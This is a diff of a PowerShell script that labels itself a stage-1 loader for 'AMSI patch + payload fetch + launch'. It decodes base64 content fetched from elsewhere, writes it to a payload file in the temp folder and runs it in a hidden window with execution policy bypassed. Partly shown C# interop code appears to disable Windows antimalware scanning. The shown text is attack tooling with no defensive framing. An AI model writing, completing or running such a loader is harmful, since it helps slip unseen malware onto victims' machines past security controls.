@@ -1,3 +1,4 @@
+# s.ps1 - stage 1: AMSI patch + payload fetch + launch
 $sc = @'
 using System;
 using System.Runtime.InteropServices;
@@ -26,7 +27,6 @@ $t = if ($r.Content -is [byte[]]) { [Text.Encoding]::UTF8.GetString($r.Content) 
 $t = $t -replace '\s',''
 $src = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($t))
 
-# Write the actual payload to disk, then run it as a file
 $p = "$env:TEMP\payload.ps1"
 [IO.File]::WriteAllText($p, $src)
 & powershell.exe -w hidden -nop -ep bypass -File $p
